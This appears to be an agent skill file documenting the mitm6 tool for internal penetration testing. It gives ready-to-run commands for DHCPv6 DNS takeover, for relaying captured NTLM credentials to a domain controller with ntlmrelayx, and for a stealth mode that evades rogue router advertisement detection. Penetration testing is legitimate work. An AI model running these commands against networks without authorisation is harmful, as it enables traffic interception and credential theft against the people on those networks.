---
name: mitm6
description: Exploit default Windows configurations to take over DNS by replying to DHCPv6 messages. It provides victims with a link-local IPv6 address and sets the attacker's host as the default DNS server. Use during internal penetration testing to perform Man-in-the-Middle (MitM) attacks, capture credentials via NTLM relaying, or intercept network traffic in IPv4 environments where IPv6 is enabled but unconfigured.
---

# mitm6

## Overview
mitm6 is a pentesting tool that exploits the fact that Windows clients by default query for an IPv6 configuration via DHCPv6. By acting as a rogue DHCPv6 server, mitm6 assigns IPv6 addresses to clients and sets the attacker's IP as the primary DNS server. This allows the attacker to redirect traffic to their own tools (like ntlmrelayx) for credential harvesting or relaying. Category: Sniffing & Spoofing.

## Installation (if not already installed)
Assume mitm6 is already installed. If the command is missing:

```bash
sudo apt update && sudo apt install mitm6
```

## Common Workflows

### Basic Attack
Listen on the default interface and start responding to DHCPv6 requests to take over DNS for the local network.
```bash
sudo mitm6
```

### Targeted Attack with Filtering
Only respond to DHCPv6 requests from a specific internal domain to minimize noise and impact on unrelated systems.
```bash
sudo mitm6 -d internal.corp
```

### Combined with ntlmrelayx (Typical Usage)
In one terminal, run mitm6 to capture DNS:
```bash
sudo mitm6 -i eth0 -d internal.corp
```
In a second terminal, run `ntlmrelayx` from the impacket suite to relay the intercepted credentials:
```bash
sudo ntlmrelayx.py -6 -t ldaps://primary-dc.internal.corp -wh attacker-wpad.internal.corp
```

### Stealthier Mode (No Router Advertisements)
Avoid sending Router Advertisements (RA) to bypass some basic rogue RA detection systems.
```bash
sudo mitm6 -a
```

## Complete Command Reference

```
mitm6 [-h] [-i INTERFACE] [-l LOCALDOMAIN] [-4 ADDRESS] [-6 ADDRESS]
      [-m ADDRESS] [-a] [-r TARGET] [-v] [--debug] [-d DOMAIN]
      [-b DOMAIN] [-hw DOMAIN] [-hb DOMAIN] [--ignore-nofqdn]
```

### General Options

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show the help message and exit |
| `-i`, `--interface INTERFACE` | Interface to use (default: autodetect) |
| `-l`, `--localdomain LOCALDOMAIN` | Domain name to use as DNS search domain (default: use first DNS domain) |
| `-4`, `--ipv4 ADDRESS` | IPv4 address to send packets from (default: autodetect) |
| `-6`, `--ipv6 ADDRESS` | IPv6 link-local address to send packets from (default: autodetect) |
| `-m`, `--mac ADDRESS` | Custom MAC address - probably breaks stuff (default: MAC of selected interface) |
| `-a`, `--no-ra` | Do not advertise ourselves (useful for networks which detect rogue Router Advertisements) |
| `-r`, `--relay TARGET` | Authentication relay target; used as fake DNS server hostname to trigger Kerberos auth |
| `-v`, `--verbose` | Show verbose information |
| `--debug` | Show debug information |

### Filtering Options

| Flag | Description |
|------|-------------|
| `-d`, `--domain DOMAIN` | Domain name to filter DNS queries on (Allowlist principle, multiple can be specified) |
| `-b`, `--blocklist`, `--blacklist DOMAIN` | Domain name to filter DNS queries on (Blocklist principle, multiple can be specified) |
| `-hw`, `-ha`, `--host-allowlist`, `--host-whitelist DOMAIN` | Hostname (FQDN) to filter DHCPv6 queries on (Allowlist principle, multiple can be specified) |
| `-hb`, `--host-blocklist`, `--host-blacklist DOMAIN` | Hostname (FQDN) to filter DHCPv6 queries on (Blocklist principle, multiple can be specified) |
| `--ignore-nofqdn` | Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option |

## Notes
- **Impact**: mitm6 can be disruptive to network connectivity if not used carefully. It effectively makes the attacker the primary DNS provider for victims.
- **Windows Behavior**: This tool is highly effective against Windows environments because Windows prefers IPv6 over IPv4 by default.
- **Integration**: Best used in conjunction with `impacket-ntlmrelayx` to exploit the DNS takeover.
- **Duration**: mitm6 will continue to respond to requests until stopped (Ctrl+C). Once stopped, victims will eventually revert to their original DNS settings when their IPv6 lease expires or they refresh their network configuration.